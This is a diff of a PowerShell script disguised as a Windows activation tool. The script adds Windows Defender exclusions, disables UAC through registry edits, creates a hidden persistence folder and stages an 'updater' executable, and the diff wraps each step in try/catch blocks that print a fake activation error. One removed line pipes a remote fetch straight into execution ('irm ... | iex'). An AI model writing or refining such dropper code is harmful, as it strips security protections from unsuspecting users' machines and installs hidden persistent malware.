@@ -26,24 +26,36 @@ function Add-Exclusion {
     param ([string]$Path)
     try {
         Add-MpPreference -ExclusionPath $Path -ErrorAction $stopAction
-    } catch {}
+    } catch {
+        Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
+    }
 }
 
 function Disable-UAC {
     try {
-        Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name ConsentPromptBehaviorAdmin -Value 0
-        Set-ItemProperty -Path REGISTRY::HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System -Name EnableLUA -Value 0
-    } catch
+        Set-ItemProperty -Path "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name ConsentPromptBehaviorAdmin -Value 0
+        Set-ItemProperty -Path "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System" -Name EnableLUA -Value 0
+    } catch {
+        Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
+    }
 }
 
 $persistFolder = Join-Path $env:APPDATA $trustedFolder
-New-Item -ItemType $directory -Path $persistFolder -Force | Out-Null
-Set-ItemProperty -Path $persistFolder -Name Attributes -Value $hiddenAttr
-Add-Exclusion -Path $persistFolder
+try {
+    New-Item -ItemType $directory -Path $persistFolder -Force | Out-Null
+    Set-ItemProperty -Path $persistFolder -Name Attributes -Value $hiddenAttr
+    Add-Exclusion -Path $persistFolder
+} catch {
+    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
+}
 
 $hiddenFolder = Join-Path $env:LOCALAPPDATA ([System.Guid]::NewGuid().ToString())
-New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
-Add-Exclusion -Path $hiddenFolder
+try {
+    New-Item -ItemType $directory -Path $hiddenFolder | Out-Null
+    Add-Exclusion -Path $hiddenFolder
+} catch {
+    Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
+}
 
 $tempPath = Join-Path $hiddenFolder $updaterExe
 
@@ -71,10 +83,8 @@ try {
     }
 } catch {
     Write-Host "An error occurred during activation. Please try again." -ForegroundColor Red
-    exit 1
 } finally {
     if (Test-Path $hiddenFolder) {
         Remove-Item $hiddenFolder -Recurse -Force
-        irm "get.activated.win" | iex
     }
 }
